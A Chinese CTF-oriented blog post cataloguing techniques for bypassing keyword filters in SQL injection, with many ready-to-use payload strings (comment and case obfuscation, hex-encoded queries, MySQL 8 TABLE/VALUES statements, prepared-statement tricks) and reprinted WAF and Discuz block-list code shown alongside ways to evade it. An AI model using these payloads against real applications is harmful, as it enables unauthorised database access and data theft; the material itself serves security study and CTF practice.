---
title: sql注入针对关键字过滤的绕过技巧
date: 2018-10-14 18:07:45
tags:
    - ctf
    - sql
    - bypass
categories:
    - ctf
keywords:
    - ctf
    - sql
    - bypass
    - sql injection
    - sql注入
    - 关键词屏蔽
    - sql屏蔽
    - 语法新特性
    - sql注入绕过
    - tables语句
    - values语句
---

在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。
<!--more-->

> 2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加sql注入过滤和检测的几种思路和绕过方法

## 过滤空格

### 使用注释符`/**/`绕过

```sql
SELECT/**/name/**/FROM/**/table
```

### 使用**url编码**绕过

```sql
%a0 发出去就是空格的意思，但是需要在burp中抓包后修改
```

### 使用**浮点数**绕过

```sql
select * from users where id=8E0union select 1,2,3
等价于
select * from users where id=8.0 select 1,2,3
```

### 使用**Tab**替代空格

### 使用**两个空格**替代一个空格

### 使用**括号**绕过

如果空格被过滤，括号没有被过滤，可以用括号绕过。
在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

例如：

```sql
select(user())from dual where(1=1)and(2=2)
```

这种过滤方法常常用于time based盲注,例如：

```sql
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
```

## 过滤引号

### 使用**16进制**绕过

会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：

```sql
select column_name  from information_schema.tables where table_name="users"
```

这个时候如果引号被过滤了，那么上面的`where`子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
`users`的十六进制的字符串是`7573657273`。那么最后的sql语句就变为了：

```sql
select column_name  from information_schema.tables where table_name=0x7573657273
```

## 过滤逗号

### 使用**from关键字**绕过

对于`substr()`和`mid()`这两个方法可以使用`from to`的方式来解决：

```sql
select substr(database() from 1 for 1);
select mid(database() from 1 for 1);
```

### 使用**join关键字**绕过

```sql
union select 1,2
等价于
union select * from (select 1)a join (select 2)b
```

### 使用**like关键字**绕过

```sql
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'
```

### 使用**offset关键字**绕过

对于limit可以使用offset来绕过：

```sql
select * from news limit 0,1
等价于
select * from news limit 1 offset 0
```

## 过滤注释符（ `#` 和 `--` ）

### 手动闭合引号，不使用注释符

```sql
id=1' union select 1,2,3||'1
```

或者：

```sql
id=1' union select 1,2,'3
```

## 过滤比较符号 （ `<` 和 `>` ）

### 使用**`greatest()`、`least（）`函数**绕过

greatest()、least（）：（前者返回最大值，后者返回最小值）

同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了

最常见的一个盲注的sql语句：

```sql
select * from users where id=1 and ascii(substr(database(),0,1))>64
```

此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值

那么上面的这条sql语句可以使用greatest变为如下的子句:

```sql
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
```

### 使用**`between` `and`**绕过

between a and b：返回a，b之间的数据，不包含b。

## 过滤等号（ `=` ）

### 使用like 、rlike 、regexp 或者 使用< 或者 >

## 过滤`or` `and` `xor` `not`

### 使用符号代替

```sql
and=`&&`  or=`||`   xor=`|`   not=`!`
```

## 过滤`union`，`select`，`where`等

### 使用**注释符**绕过

常用注释符：

`//`、`--`、`/**/`、`#`、`--+`、`---`、`;`、`%00`、`--a`

用法：

```sql
U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user
```

### 使用**大小写**绕过

```sql
id=-1'UnIoN/**/SeLeCT
```

### 使用**内联注释**绕过

```sql
id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#
```

### 使用**双关键字**绕过（若删除掉第一个匹配的union就能绕过）

```sql
id=-1'UNIunionONSeLselectECT1,2,3–-
```

### 使用**加号+拆解字符串**

```sql
or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ )
```

### 使用语法新特性绕过屏蔽select

在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据

#### TABLE 语句

可以直接列出表的全部内容

```sql
TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
```

如 `select * from user` 就可以用 `table user` 替代来进行绕过

#### VALUES 语句

可以列出一行的值

```sql
VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]

row_constructor_list:
 ROW(value_list)[, ROW(value_list)][, ...]

value_list:
 value[, value][, ...]

column_designator:
 column_index
```

例如直接列出一行的值

```sql
VALUES ROW(1,2,3), ROW(4,5,6);
```

> VALUES和TABLES语句的结果都是表数据，可以结合起来使用

## 使用**编码**绕过过滤

如`URLEncode`编码，`ASCII`,`HEX`,`unicode`编码绕过

`or 1=1`即`%6f%72%20%31%3d%31`，而`Test`也可以为`CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)`

## 使用**等价函数**绕过过滤

```sql
hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

mid()、substr() ==> substring()

@@user ==> user()

@@datadir ==> datadir()

举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　

或者：
substr((select 'password'),1,1) = 0x70
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
```

## 补充：进行过滤的几种思路

### 黑名单字符替换

这种是最简单的，针对某些黑名单关键字，直接进行 str_replace

如果替换的不完全，可以用 `selselectect` 来替换 `select` 绕过

### 正则匹配

在一些waf或者cms会见到类似如下的防护代码

```php
$filter = "\\<.+javascript:window\\[.{1}\\\\x|<.*=(&#\\d+?;?)+?>|<.*(data|src)=data:text\\/html.*>|\\b(alert\\(|confi
rm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\()|<[a-z]+?\\b[^>]*?\\bon([a-z]{4,})
\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|<
|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|<\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\(|@{1
,2}\w+?\s*|\s+?.+?|.*(`|'|\").+(`|'|\")\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)SET|INSER
T\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM\s+?|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|FROM\s.?|\(select|\(\s
select|\bunion\b|select\s.+?";
```

这里面匹配了各种模式的注入语句，但是还是可以绕过的

比如说 `INSERT\\s+INTO.+?VALUES` 可以使用 `insert into xxx select` 的方式进行绕过

在经过不断的更新换代升级之后，产生了一些非常经典的正则，主要考虑到注入获取数据的时候需要联合查询或者子查询来完成

例如discuz的防护代码 `_do_query_safe`

```php
$_config['security']['querysafe']['dfunction'] = array('load_file','hex','substring','if','ord','char');
$_config['security']['querysafe']['daction'] = array('@','intooutfile','intodumpfile','unionselect','(select', 'un
ionall', 'uniondistinct');
$_config['security']['querysafe']['dnote'] = array('/*','*/','#','--','"');
...
$clean = preg_replace("/[^a-z0-9_\-\(\)#\*\/\"]+/is", "", strtolower($clean));
...
if (is_array(self::$config['dfunction'])) {
    foreach (self::$config['dfunction'] as $fun) {
        if (strpos($clean, $fun . '(') !== false)
            return '-1';
    }
}
```

这段代码首先将sql语句除了`a-z``0-9`和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似`unionall`、`(select`这样的获取数据所要用到的代码，就拒绝执行

但是即便是这样也还可以绕过，比如同表注入就不需要用到子查询

```sql
select * from test where test3=-1 or substr(test2,1,1)=1
```

或者可以使用多语句的方式执行

```sql
set @a:=0x73656c656374202a2066726f6d2074657374;
prepare s from @a;
execute s;
```

也可以

```sql
handler user open;
handler user read first;
```

### 语义分析

这是最高级的方式，模仿mysql对sql的分析，waf对用户的输入进行语法语义分析，如果符合mysql的语法，就判断为sql注入从而阻断

这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过

例如我们上面说的mysql8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到
